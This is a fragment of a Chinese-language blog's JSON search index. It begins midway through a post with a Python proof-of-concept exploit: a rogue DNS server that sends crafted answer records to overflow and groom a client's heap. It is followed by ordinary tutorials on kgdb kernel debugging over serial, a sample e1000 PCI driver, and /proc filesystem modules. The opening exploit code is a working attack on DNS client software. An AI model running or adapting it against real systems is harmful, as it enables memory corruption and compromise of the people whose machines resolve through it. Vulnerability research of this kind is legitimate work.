&quot;send query&quot;def getNameLen(data): s = 0 o = 14 l=ord(data[o:o+1]) while l: s += l+1 print l o += 1+l l = ord(data[o:o+1]) return s+1def get_alloc_1_c0h_and_ow_c0h(n, n_answer): p0 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\x00\\x2d&#x27;+&#x27;a&#x27;*18+&#x27;\\xc0\\x0d&#x27;+&#x27;a&#x27;*7+&#x27;\\x10&#x27;+&#x27;\\x39&#x27;+&#x27;a&#x27;*0xf+&#x27;\\x00&#x27; # len 79h p1 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x5c\\xf5\\x00\\xec&#x27;+&#x27;\\xff\\x7a&#x27;+&#x27;a&#x27;*18+&#x27;\\xc0\\x0e&#x27;+&#x27;a&#x27;*9+&#x27;\\x39&#x27;+&#x27;a&#x27;*0x39+&#x27;\\x39&#x27;+&#x27;a&#x27;*0x39+&#x27;\\x15&#x27;+&#x27;a&#x27;*0x15+&#x27;\\x00&#x27; # 87h n_answer[0] = 2 return p0+p1+&#x27;\\xcc&#x27;*0xff00def get_alloc_ow_size(size, n_answer): n_answer[0] = size/8-2 if size &gt; (0xd1+0x48): raise &#x27;size is too big&#x27; n = 0xff &amp; ((0x10000|(size-0x48))-0xff) p0 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\xff&#x27;+chr(n)+&#x27;\\xaa&#x27;*18+&#x27;\\xc0\\x0d&#x27;+&#x27;a&#x27;*7+&#x27;\\x39&#x27;+&#x27;a&#x27;*0x39+&#x27;\\x39&#x27;+&#x27;a&#x27;*0x39+&#x27;\\x39&#x27;+&#x27;a&#x27;*0x39+&#x27;\\x15&#x27;+&#x27;a&#x27;*0x15+&#x27;\\x00&#x27; fake_header = &#x27;\\xcc&#x27;*16+&#x27;\\x00\\x00\\x00\\x00\\xbb\\x22\\xa3\\x00\\xef\\x0b\\x0b\\xfe\\xef\\x0b\\x0b\\xfe&#x27;+&#x27;a&#x27;*(size-0x10) padsize = 2*(size+0x10)-(0x10+0x4c+0xff-size)-(len(p0)-0x20) fake_num = (0xffff-0x20-len(p0)-padsize)/(size+0x10) print &#x27;padsize:%x,fake_num:%x&#x27;%(padsize, fake_num) return p0+&#x27;b&#x27;*padsize+fake_header*fake_numdef get_alloc_ow_size_without_records(size, n_answer): n_answer[0] = 2 if size &gt; (0xd1+0x48): raise &#x27;size is too big&#x27; n = 0xff &amp; ((0x10000|(size-0x48))-0xff) p0 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\xff&#x27;+chr(n)+&#x27;\\xaa&#x27;*18+&#x27;\\xc0\\x0d&#x27;+&#x27;a&#x27;*7+&#x27;\\x39&#x27;+&#x27;a&#x27;*0x39+&#x27;\\x39&#x27;+&#x27;a&#x27;*0x39+&#x27;\\x39&#x27;+&#x27;a&#x27;*0x39+&#x27;\\x15&#x27;+&#x27;a&#x27;*0x15+&#x27;\\x00&#x27; fake_header = &#x27;\\xcc&#x27;*16+&#x27;\\x00\\x00\\x00\\x00\\xbb\\x22\\xa3\\x00\\xef\\x0b\\x0b\\xfe\\xef\\x0b\\x0b\\xfe&#x27;+&#x27;a&#x27;*(size-0x10) padsize = 2*(size+0x10)-(0x10+0x4c+0xff-size)-(len(p0)-0x20) fake_num = (0xffff-0x20-len(p0)-padsize)/(size+0x10) print &#x27;padsize:%x,fake_num:%x&#x27;%(padsize, fake_num) return p0+&#x27;b&#x27;*padsize+fake_header*fake_numdef get_alloc_2_A9h_and_ow(n, n_answer): n_answer[0] = 3 p0 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\x00\\x21&#x27;+&#x27;\\x00&#x27;*18+&#x27;\\xc0\\x0d&#x27;+&#x27;\\x00&#x27;*7+&#x27;\\x04&#x27;+&#x27;\\x11&#x27;+&#x27;\\x39&#x27;+&#x27;\\x00&#x27;*0x2+&#x27;\\x00&#x27; p1 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\x00\\x14&#x27;+&#x27;\\x00&#x27;*18+&#x27;\\xc0\\x0e&#x27; p2 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\xff\\x62&#x27;+&#x27;\\x00&#x27;*10+&#x27;\\x39&#x27;+&#x27;\\x00&#x27;*7+&#x27;\\xc0\\x0f&#x27;+&#x27;\\x00&#x27;*0x30+&#x27;\\x39&#x27;+&#x27;a&#x27;*0x39+&#x27;\\x15&#x27;+&#x27;a&#x27;*0x15+&#x27;\\x00&#x27; size = 0xb0 padsize = 2*(size+0x10)-(0x10+0x4c+0xff-size)-(len(p2)-0x20) fake_header = &#x27;\\xcc&#x27;*16+&#x27;\\x00\\x00\\x00\\x00\\xbb\\x22\\xa3\\x00\\xef\\x0b\\x0b\\xfe\\xef\\x0b\\x0b\\xfe&#x27;+&#x27;\\x00&#x27;*(size-0x10) fake_num = (0xffff-0x20-len(p0)-len(p1)-len(p2)-padsize)/(size+0x10) print &#x27;padsize:%x,fake_num:%x&#x27;%(padsize, fake_num) return p0+p1+p2+&#x27;b&#x27;*padsize+fake_header*fake_numdef get_alloc_C0h_many(number, n_answer): if number &gt; 0x7fd: print &quot;number is too big&quot; return None # size = (size-0x48-0x3a-0x1c)/2 p0 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\x00\\x2d&#x27;+&#x27;\\x00&#x27;*18+&#x27;\\xc0\\x0d&#x27;+&#x27;\\x00&#x27;*7+&#x27;\\x10&#x27;+&#x27;\\x28&#x27;+&#x27;\\x00&#x27;*0xf+&#x27;\\x00&#x27; p1 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\x00\\x14&#x27;+&#x27;\\x00&#x27;*18+&#x27;\\xc0\\x0e&#x27; n_answer[0] = number+1 return p0+p1*(number-1)def get_alloc_A9h_many(number, n_answer): if number &gt; 0x7fd: print &quot;number is too big&quot; return None # size = (size-0x48-0x3a-0x1c)/2 p0 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\x00\\x21&#x27;+&#x27;\\x00&#x27;*18+&#x27;\\xc0\\x0d&#x27;+&#x27;\\x00&#x27;*7+&#x27;\\x04&#x27;+&#x27;\\x11&#x27;+&#x27;\\x39&#x27;+&#x27;\\x00&#x27;*0x2+&#x27;\\x00&#x27; p1 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\x00\\x14&#x27;+&#x27;\\x00&#x27;*18+&#x27;\\xc0\\x0e&#x27; n_answer[0] = number+1 return p0+p1*(number-1)def get_alloc_max(n, n_answer): n_answer[0] = 2 if n &gt; 0x10047 or n &lt; (0x48+0x3b): raise &quot;number is too large or small&quot; size = 0xff&amp;(n-0x48-0x3b) size_h = (n-0x48-0x3b)&gt;&gt;8 p0 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+chr(size_h)+chr(size)+&#x27;a&#x27;*18+&#x27;\\xc0\\x0d&#x27; # size = 0xffc4+0x3b = 0xffff return p0def get_alloc_max_and_free(n, n_answer): n_answer[0] = (n+0x100)/8 if n &gt; 0x10047: raise &quot;number is too large&quot; size = 0xff&amp;(n-0x48-0x3b) p0 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\xff&#x27;+chr(size)+&#x27;a&#x27;*18+&#x27;\\xc0\\x0d&#x27; # size = 0xffc4+0x3b = 0xffff return p0def tcp_handler(): server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server.bind((&#x27;0.0.0.0&#x27;,53)) server.listen(5) # totalSize = 0 # size = totalSize-0x48-0 n_answer = [0] funcs = [ get_alloc_A9h_many, get_alloc_ow_size, get_alloc_max, get_alloc_2_A9h_and_ow, get_alloc_max_and_free, get_alloc_ow_size_without_records ] steps = [ (3, funcs[0], 0x700), # (1, funcs[0], 0x80), (0x80, funcs[2], 0x10000), (1, funcs[4], 0x10000), (1, funcs[2], 0x10000), (1, funcs[5], 0x100) ] step = 0 step_i = 0 while True: conn,addr = server.accept() print addr while True: print &#x27;step:&#x27;,step,&#x27;step_i&#x27;, step_i data = conn.recv(1024) if not data: continue # print &#x27;recive:&#x27;,data.encode(&#x27;hex&#x27;) ba = bytearray() # real size is 0xa8+0x48 = 0x100 data = &#x27;&#123;:\\x00&lt;65537&#125;&#x27;.format(data[:18+getNameLen(data)]+steps[step][1](steps[step][2], n_answer)) ba.extend(map(ord, data)) ba[0] = struct.pack(&#x27;&gt;H&#x27;, 0xffff)[0] ba[1] = struct.pack(&#x27;&gt;H&#x27;, 0xffff)[1] # flags ba[4] = 0x84 ba[5] = 0 # answer PRs ba[8] = n_answer[0]&gt;&gt;8 ba[9] = n_answer[0]&amp;0xff # other prs ba[10] = 0 ba[11] = 0 ba[12] = 0 ba[13] = 0 data = bytes(ba) if step == 4: thread.start_new_thread(sendAQuery,()) time.sleep(0.001) l = conn.send(data) print &#x27;sent&#x27;,hex(l), hex(len(data)) print &#x27;---------------------------\\n&#x27; conn.close() step_i += 1 if steps[step][0] == step_i: step += 1 step_i = 0 break print &#x27;tcp recv exit&#x27;def udp_handler(): s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.bind((&#x27;0.0.0.0&#x27;, 53)) while True: data, addr = s.recvfrom(2048) print &quot;received:&quot;, data.encode(&#x27;hex&#x27;), &quot;from&quot;, addr ba = bytearray() ba.extend(map(ord, data+resp)) ba[2] = 0x86 ba[7] = 1 data = bytes(ba) l = s.sendto(data, addr) print &quot;sent&quot;, hex(l), hex(len(data)) print &#x27;-++++++++++++++++++++++\\n&#x27; s.close() print &#x27;close udp&#x27;import threadthread.start_new_thread(udp_handler,())thread.start_new_thread(tcp_handler,())raw_input(&#x27;&gt;&#x27;) 其它以下是溢出的长度计算方式: 注意: 以上所有poc的溢出参数和域名长度以及’9999’密切相关, 如果要修改, 注意更改相应的参数.","categories":[],"tags":[],"keywords":[]},{"title":"Linux双虚拟机调试及自定义驱动示例","slug":"linux-debug-setting","date":"2022-06-17T11:38:05.937Z","updated":"2022-03-23T07:23:09.912Z","comments":true,"path":"2022/06/17/linux-debug-setting/","link":"","permalink":"http://474172261.github.io/2022/06/17/linux-debug-setting/","excerpt":"本文章主要简介如何准备vmware的双机调试, 并示例了一些简单的驱动编写和调试信息","text":"本文章主要简介如何准备vmware的双机调试, 并示例了一些简单的驱动编写和调试信息 准备内核linux kernel source 配置虚拟机 新建一个虚拟机 添加串口, 并做如下配置此虚拟机作为被调试机 克隆虚拟机 修改串口设备的配置,设定为”该端为客户端”, 此为调试机 在被调试机编译内核 解压内核 12tar jxvf linux-2.6.26.tar.bz2cd linux-* 安装组件 1sudo apt-get install libncurses-dev gawk flex bison openssl libssl-dev dkms libelf-dev libudev-dev libpci-dev libiberty-dev autoconf 配置编译参数 1make menuconfig 可能的错误 12345678error: curses.h: No such file or directory基于Debian的发行版（如Debian、Ubuntu）：sudo apt-get install libncurses5-dev基于Red Hat的发行版（如RHEL、CentOS）：sudo yum install ncurses-devel如果出现找不到该包，尝试以下设置：vi /etc/apt/source.list添加其它系统的源[源列表地址](http://mirrors.163.com/.help/debian.html)比如kali,我添加的debian jessie的源 如果提示窗口太小出错,说明你的命令行窗口小了,放大一点再试试.内核调试需要做如下设置: 1234567Kernel Hacking –&gt; compile-time checks and compiler options –&gt; [*] Compile the kernel with debug info [*] Compile the kernel with frame pointers [*] kernel debugging [*] KGDB: kernel debugger–&gt; &lt;*&gt; KGDB: use kgdb over the serial console 完成上述选项后, 直接save后推出. 编译内核 1234make -j 4 bzImage # -j 代表用多少线程, 不要超过cpu的最大线程数make modulesmake modules_installmake install 修改启动表打开 &#x2F;boot&#x2F;grub&#x2F;grub.conf (如果不存在, 就改grub.cfg文件)针对 grub.conf 123456789101112131415161718192021 1 # grub.conf generated by anaconda 2 # 3 # Note that you do not have to rerun grub after making changes to this file 4 # NOTICE: You have a /boot partition. This means that 5 # all kernel and initrd paths are relative to /boot/, eg. 6 # root (hd0,0) 7 # kernel /vmlinuz-version ro root=/dev/VolGroup00/LogVol00 8 # initrd /initrd-version.img 9 #boot=/dev/hda10 default=011 timeout=512 splashimage=(hd0,0)/grub/splash.xpm.gz13 hiddenmenu14 title CentOS (2.6.26)15 root (hd0,0)16 kernel /vmlinuz-2.6.26 ro root=/dev/VolGroup00/LogVol00 17 initrd /initrd-2.6.26.img18 title CentOS-4 i386 (2.6.9-67.ELsmp)19 root (hd0,0)20 kernel /vmlinuz-2.6.9-67.ELsmp ro root=/dev/VolGroup00/LogVol00 &lt;---------------------21 initrd /initrd-2.6.9-67.ELsmp.img 在kernel那一行末尾添加 “kgdboc&#x3D;ttyS0,115200 nokaslr” nokaslr是禁用内核的kaslr机制, 避免某些情况下内核地址随机化导致gdb没办法识别源码. 更多命令可以参考Using kgdb, kdb and the kernel debugger internals 如下图:针对 grub.cfg: 123456789101112131415161718192021menuentry &#x27;Ubuntu, with Linux 3.8.0-19-generic&#x27; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &#x27;gnulinux-3.8.0-19-generic-advanced-af5e68c6-4f1f-494e-8c35-fc0911ec3564&#x27; &#123;recordfail load_video gfxmode $linux_gfx_mode insmod gzio insmod part_msdos insmod ext2 set root=&#x27;hd0,msdos1&#x27; if [ x$feature_platform_search_hint = xy ]; then search --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos1 --hint-efi=hd0,msdos1 --hint-baremetal=ahci0,msdos1 af5e68c6-4f1f-494e-8c35-fc0911ec3564 else search --no-floppy --fs-uuid --set=root af5e68c6-4f1f-494e-8c35-fc0911ec3564 fi echo &#x27;Loading Linux 3.8.0-19-generic ...&#x27; linux /boot/vmlinuz-3.8.0-19-generic root=UUID=af5e68c6-4f1f-494e-8c35-fc0911ec3564 ro find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US kgdboc=ttyS0,115200 kgdbwait quiet ^ | ------------- echo &#x27;Loading initial ramdisk ...&#x27; initrd /boot/initrd.img-3.8.0-19-generic&#125; 在新内核对应的内容下添加 “kgdboc&#x3D;ttyS0,115200” 测试双机调试开启两个虚拟机, 在被调试机上运行命令 1echo hello &gt;/dev/ttyS0 在调试机上运行 1cat /dev/ttyS0 如果调试机没有收到消息, 就实时用&#x2F;dev&#x2F;ttyS1, 多试两下就行如果成功了, 记得改grub的配置. 开始调试如果grub没有配置”kgdbwait”参数, 就在被调试机开机后输入 1echo g &gt;/proc/sysrq-tirgger 在调试机里 1234567891011$ gdb linux-3.18.34/vmlinux.....(gdb) set remotebaud 115200(gdb) target remote /dev/ttyS0Remote debugging using /dev/ttyS0kgdb_breakpoint () at kernel/kgdb.c:16741674 wmb(); /*Sync point after breakpoint */warning: shared library handler failed to enable breakpoint(gdb) 如果”set remotebaud 115200”的时候出错,就换成”set serial baud 115200” 调试自定义驱动一个简单的驱动文件可以是如下形式(test.c): 12345678910111213141516171819#include &lt;linux/module.h&gt; #include &lt;asm/io.h&gt; #include &lt;linux/slab.h&gt;#include &lt;linux/ioport.h&gt; MODULE_LICENSE(&quot;GPL&quot;); int my_module_init(void)&#123; printk(&quot;module init done\\n&quot;); return 0;&#125;void my_module_exit(void)&#123; printk(&quot;module exit\\n&quot;); return;&#125;module_init( my_module_init );//声明初始化函数module_exit( my_module_exit ); Makefile 文件内容如下: 12345678obj-m += test.omymodule-objs:=module KDIR:=/lib/modules/$(shell uname -r)/buildMAKE:=make default: $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules clean: $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) clean 注意, $(MAKE)前是tab, 不是空格! 准备编译环境并编译安装驱动: 123root@ubuntu:/home/vv# apt install bison flex gcc autoconf -yroot@ubuntu:/home/vv# makeroot@ubuntu:/home/vv# insmod test.ko 如果想在加载驱动时拦截, 可以考虑在module_init里的入口函数处添加一个int3断点 asm(&quot;.byte 0xcc&quot;);实现. 如果想带符号, 假设我们要调试带符号的kvm.ko驱动, 首先在被调试机上通过cat /proc/modules|grep获取驱动基址: 123root@ubuntu:/home/vv# cat /proc/modules |grep kvmkvm_intel 294912 0 - Live 0xffffffffc066c000kvm 843776 1 kvm_intel, Live 0xffffffffc055e000 此处可以看到, kvm的基址是0xffffffffc055e000.然后通过echo g &gt;/proc/sysrq-tirgger 使内核中断.然后在调试器里输入以下命令添加符号: 12345gdb$ add-symbol-file arch/x86/kvm/kvm.ko 0xffffffffc055e000add symbol table from file &quot;arch/x86/kvm/kvm.ko&quot; at .text_addr = 0xffffffffc055e000Reading symbols from arch/x86/kvm/kvm.ko...gdb$ 这代表我们添加成功了. 也可以索引到kvm的符号了. 简单的e1000网卡驱动示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#include &lt;asm/dma.h&gt;#include &lt;asm/page.h&gt;#include &lt;linux/slab.h&gt;#include &lt;linux/pci.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/random.h&gt;#include &lt;linux/pci_ids.h&gt;#include &lt;linux/delay.h&gt;#define LOG &quot;MYMOD:&quot;char e1000_driver_name[] = &quot;t_e1000e&quot;;static const struct pci_device_id e1000_pciid_table[] = &#123; &#123; PCI_VDEVICE(INTEL, 0x10D3), 3 &#125;,//E1000_DEV_ID_82574L) , board_82574 &#123;0&#125;&#125;;struct E1000_ADAPTER &#123; u8 *hw_addr0; u8 *hw_addr1;&#125; *adapter=NULL;#define LOGTAG &quot;TEST: &quot;void klog(char *fmt, ...)&#123; char textbuf[1024-32]; va_list args; u32 len = 0; char *tmp = fmt; va_start(args, fmt); while(*tmp)&#123; len++; tmp++; &#125; memcpy(textbuf, LOGTAG, sizeof(LOGTAG)-1); memcpy(textbuf + sizeof(LOGTAG) - 1, fmt, len); memcpy(textbuf + sizeof(LOGTAG) + len - 1, &quot;\\n&quot;, 2); vprintk(textbuf, args); va_end(args); return ;&#125;static int e1000_probe_device(struct pci_dev *pdev, const struct pci_device_id *id)&#123;// 3. 触发探测函数后, 操作因设备而异, 但是大同小异. unsigned long mmio_start, mmio_len; u64 dma; int err = pci_enable_device_mem(pdev);// 4. enable mem printk(&quot;probe device\\n&quot;); if(err)&#123; printk(LOG&quot;fail to enable device!\\n&quot;); return err; &#125; err = pci_request_selected_regions_exclusive(pdev, pci_select_bars(pdev, 0x200), e1000_driver_name);//IORESOURCE_MEM 5. 激活设备的IOport/IOmem if (err) &#123; printk(LOG&quot;Failed to request region for adapter\\n&quot;); return err; &#125; adapter=dma_zalloc_coherent(&amp;pdev-&gt;dev, sizeof(struct E1000_ADAPTER), &amp;dma, GFP_KERNEL);; if(!adapter)&#123; printk(LOG&quot;Failed to alloc adapter\\n&quot;); return -1; &#125; pci_set_master(pdev); mmio_start = pci_resource_start(pdev, 0);// 因为e1000网卡有两个bar,所以此处需要映射bar0和bar1 mmio_len = pci_resource_len(pdev, 0); adapter-&gt;hw_addr0 = ioremap(mmio_start, mmio_len);// 6. 映射设备IOmem if (!adapter-&gt;hw_addr0) &#123; printk(&quot;Map 0 fail\\n&quot;); return 0; &#125; mmio_start = pci_resource_start(pdev, 1); mmio_len = pci_resource_len(pdev, 1); adapter-&gt;hw_addr1 = ioremap(mmio_start, mmio_len); if (!adapter-&gt;hw_addr1) &#123; printk(&quot;Map 1 fail\\n&quot;); return 0; &#125; // 7. 初始化好IO资源以后, 就可以开始其它初始化操作了 e1000_start(pdev); return 0;&#125;void e1000_remove_device(struct pci_dev *pdev)&#123; printk(&quot;removed device!\\n&quot;); if(adapter)&#123; if(adapter-&gt;hw_addr0) iounmap(adapter-&gt;hw_addr0); if(adapter-&gt;hw_addr1) iounmap(adapter-&gt;hw_addr1); &#125; pci_release_selected_regions(pdev, pci_select_bars(pdev, 0x200));//IORESOURCE_MEM pci_disable_device(pdev);&#125;void e1000_shutdown_device(struct pci_dev *pdev)&#123; //do nothing return;&#125;static struct pci_driver e1000_driver = &#123;// 1. 准备驱动描述符 .name = e1000_driver_name,// 包括驱动名称 .id_table = e1000_pciid_table,// 硬件id .probe = e1000_probe_device,// 硬件被识别后,第一次调用到的探测函数 .remove = e1000_remove_device, .shutdown = e1000_shutdown_device,&#125;;int main_init(void)&#123; int err = pci_register_driver(&amp;e1000_driver);// 2. 注册驱动, 当识别到注册的硬件id后, 就会调用probe函数. printk(LOG&quot;mod init!\\n&quot;); return err;&#125;void main_exit(void)&#123; pci_unregister_driver(&amp;e1000_driver); printk(LOG&quot;mod exit!\\n&quot;); if(adapter)&#123; kfree(adapter); &#125; return;&#125;module_init(main_init);module_exit(main_exit);","categories":[],"tags":[],"keywords":[]},{"title":"linux 内核和用户态通信之 /proc文件系统","slug":"linux-proc","date":"2022-06-17T11:38:05.937Z","updated":"2022-03-18T03:35:31.719Z","comments":true,"path":"2022/06/17/linux-proc/","link":"","permalink":"http://474172261.github.io/2022/06/17/linux-proc/","excerpt":"&#x2F;proc 文件系统是一个虚拟文件系统，通过它可以使用一种新的方法在 Linux® 内核空间和用户空间之间进行通信。在 &#x2F;proc 文件系统中，我们可以将对虚拟文件的读写作为与内核中实体进行通信的一种手段，但是与普通文件不同的是，这些虚拟文件的内容都是动态创建的.","text":"&#x2F;proc 文件系统是一个虚拟文件系统，通过它可以使用一种新的方法在 Linux® 内核空间和用户空间之间进行通信。在 &#x2F;proc 文件系统中，我们可以将对虚拟文件的读写作为与内核中实体进行通信的一种手段，但是与普通文件不同的是，这些虚拟文件的内容都是动态创建的. &#x2F;proc 文件系统包含了一些目录（用作组织信息的方式）和虚拟文件。虚拟文件可以向用户呈现内核中的一些信息，也可以用作一种从用户空间向内核发送信息的手段。 创建一个&#x2F;proc文件在3.8内核之前,使用create_proc_entry创建一个文件,原型如下: 1234567891011121314151617181920struct proc_dir_entry *create_proc_entry( const char *name, mode_t mode, struct proc_dir_entry *parent );//创建一个虚拟文件struct proc_dir_entry &#123; const char *name; // 节点名称 mode_t mode; // 权限,与chmod的一样,可以使用八进制表示 uid_t uid; // File&#x27;s user id gid_t gid; // File&#x27;s group id struct inode_operations *proc_iops; // 索引节点操作函数 struct file_operations *proc_fops; // 文件操作函数 struct proc_dir_entry *parent; // 父目录,如果是NULL,就代表/proc目录 ... read_proc_t *read_proc; // 输出给cat的函数 write_proc_t *write_proc; // 读取用户输入的函数 void *data; // 指向private 数据 atomic_t count; // 使用计数 ...&#125;;void remove_proc_entry( const char *name, struct proc_dir_entry *parent );//不仅可以删除节点,还能删除proc_mkdir创建的目录struct proc_dir_entry *proc_mkdir(const char *name, struct proc_dir_entry *parent); //创建一个虚拟目录 parent 参数可以为 NULL（表示 &#x2F;proc 根目录），也可以是很多其他值 proc_dir_entry 在文件系统中的位置 proc_root_fs &#x2F;proc proc_net &#x2F;proc&#x2F;net proc_bus &#x2F;proc&#x2F;bus proc_root_driver &#x2F;proc&#x2F;driver 如果我们想创建一个文件为test_modul的虚拟文件,就这样初始化 1234create_proc_entry( &quot;test_module&quot;, 0644, NULL );或者pt_root = proc_mkdir(&quot;test_menu&quot;, NULL);pt_entry1 = create_proc_entry(USER_ENTRY1, 0666, pt_root); &#x2F;proc文件交互函数read_proc 供用户读取的函数 1234567int mod_read( char *page,//数据写入的位置,该page缓冲区在内核 char **start, off_t off, int count,//定义写入的最大字节数 int *eof, //当数据写入完后,需要设置为1 void *data //private 数据 ); 当需要写入多页数据时(一般一页4Kb),需要用到 start,off. write_proc 读取用户的输入 12345int mod_write( struct file *filp, //指向一个打开的文件结构 const char __user *buff, //用户输入的数据,buff在用户空间,内核要读取需要用到copy_from_user unsigned long len, //长度 void *data ); 其它需要用到的函数 1234567891011121314151617181920212223242526/* 创建一个符号链接 */struct proc_dir_entry *proc_symlink( const char *name, struct proc_dir_entry *parent, const char *dest );/* Create a proc_dir_entry with a read_proc_t in one call */struct proc_dir_entry *create_proc_read_entry( const char *name, mode_t mode, struct proc_dir_entry *base, read_proc_t *read_proc, void *data );/* 从内核空间复制数据到用户空间 */unsigned long copy_to_user( void __user *to, const void *from, unsigned long n );/* 从用户空间到内核 */unsigned long copy_from_user( void *to, const void __user *from, unsigned long n );/* 创建虚拟的连续内存块 */void *vmalloc( unsigned long size );/* 释放vmalloc创建的块 */void vfree( void *addr );/* Export a symbol to the kernel (make it visible to the kernel) */EXPORT_SYMBOL( symbol );/* Export all symbols in a file to the kernel (declare before module.h) */EXPORT_SYMTAB 创建内核驱动123456789101112131415161718#include &lt;linux/module.h&gt;/* Defines the license for this LKM */MODULE_LICENSE(&quot;GPL&quot;);int my_module_init( void )//自定义的初始化函数&#123; printk(KERN_INFO &quot;my_module_init called. Module is now loaded.\\n&quot;); return 0;&#125;void my_module_cleanup( void )//自定义的退出函数&#123; printk(KERN_INFO &quot;my_module_cleanup called. Module is now unloaded.\\n&quot;); return;&#125;module_init( my_module_init );//声明初始化函数module_exit( my_module_cleanup );//声明退出函数 从3.10内核开始,create_proc_entry() 函数被替换成proc_create() 函数, 函数区别如下:修改前 123456struct proc_dir_entry *proc_file = create_proc_entry(&quot;file&quot;,0600,NULL);if (proc_file) &#123; proc_file-&gt;read_proc = file_read; proc_file-&gt;write_proc = file_write; proc_file-&gt;owner = THIS_MODULE;&#125; 修改后 12345678struct file_operations proc_fops=&#123; .read=file_read, .write=file_write, .owner=THIS_MODULE,&#125;;proc_file = proc_create(&quot;file&quot;, 0600, proc_dir, &amp;proc_fops); 编译安装驱动Makefile 1234567obj-m += simple-km.oall: make -C /lib/modules/`uname -r`/build SUBDIRS=$(PWD) modulesclean: make -C /lib/modules/`uname -r`/build SUBDIRS=$(PWD) modules 开头的是tab, 不是空格, 一定要注意 执行如下命令 12345$ make$ insmod simple-km.ko $ dmesg | tail -5 查看最后5行信息$ lsmod$ rmmod simple-km.ko 一个简单的示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/proc_fs.h&gt;#include &lt;linux/string.h&gt;#include &lt;linux/vmalloc.h&gt;#include &lt;asm/uaccess.h&gt;MODULE_LICENSE(&quot;GPL&quot;);MODULE_DESCRIPTION(&quot;Fortune Cookie Kernel Module&quot;);MODULE_AUTHOR(&quot;VictorV&quot;);#define MAX_COOKIE_LENGTH PAGE_SIZEstatic struct proc_dir_entry *proc_entry;static char *cookie_pot; // 内存缓冲区static int cookie_index; // 指向缓冲区的数据尾部static int next_fortune; // 通过\\0分开字符串,此处用来指向下一个需要输出的缓冲字符串ssize_t fortune_write( struct file *filp, const char __user *buff, unsigned long len, void *data )&#123; int space_available = (MAX_COOKIE_LENGTH-cookie_index)+1; if (len &gt; space_available) &#123; printk(KERN_INFO &quot;fortune: cookie pot is full!\\n&quot;); return -ENOSPC; &#125; if (copy_from_user( &amp;cookie_pot[cookie_index], buff, len )) &#123; //从用户空间读取数据到cookie_pot, return -EFAULT; &#125; cookie_index += len; cookie_pot[cookie_index-1] = 0;//将最后一位置零 return len;&#125;int fortune_read( char *page, char **start, off_t off,int count, int *eof, void *data )&#123; int len; if (off &gt; 0) &#123; *eof = 1; return 0; &#125; if (next_fortune &gt;= cookie_index) next_fortune = 0;//超过数据个数,就循环读取 len = sprintf(page, &quot;%s\\n&quot;, &amp;cookie_pot[next_fortune]);//将一段字符串写入page next_fortune += len; return len;&#125;int init_fortune_module( void )//初始化&#123; int ret = 0; cookie_pot = (char *)vmalloc( MAX_COOKIE_LENGTH );//申请一段内核空间 if (!cookie_pot) &#123; ret = -ENOMEM; &#125; else &#123; memset( cookie_pot, 0, MAX_COOKIE_LENGTH ); proc_entry = create_proc_entry( &quot;fortune&quot;, 0644, NULL ); if (proc_entry == NULL) &#123; ret = -ENOMEM; vfree(cookie_pot); printk(KERN_INFO &quot;fortune: Couldn&#x27;t create proc entry\\n&quot;); &#125; else &#123; cookie_index = 0; next_fortune = 0; proc_entry-&gt;read_proc = fortune_read;//这里定义输出函数 proc_entry-&gt;write_proc = fortune_write;//定义输入函数 proc_entry-&gt;owner = THIS_MODULE; printk(KERN_INFO &quot;fortune: Module loaded.\\n&quot;); &#125; &#125; return ret;&#125;void cleanup_fortune_module( void )&#123; remove_proc_entry(&quot;fortune&quot;, &amp;proc_root); vfree(cookie_pot); printk(KERN_INFO &quot;fortune: Module unloaded.\\n&quot;);&#125;module_init( init_fortune_module );module_exit( cleanup_fortune_module ); 效果: 123456789101112[root@plato]# insmod fortune.ko[root@plato]# echo &quot;Success is an individual proposition. Thomas Watson&quot; &gt; /proc/fortune[root@plato]# echo &quot;If a man does his best, what else is there? Gen. Patton&quot; &gt; /proc/fortune[root@plato]# echo &quot;Cats: All your base are belong to us. Zero Wing&quot; &gt; /proc/fortune[root@plato]# cat /proc/fortuneSuccess is an individual proposition. Thomas Watson[root@plato]# cat /proc/fortuneIf a man does his best, what else is there? General Patton[root@plato]#","categories":[],"tags":[],"keywords":[]},{"title":"在ESXi中调试运行虚拟机的vmx程序(How to debug vmx in 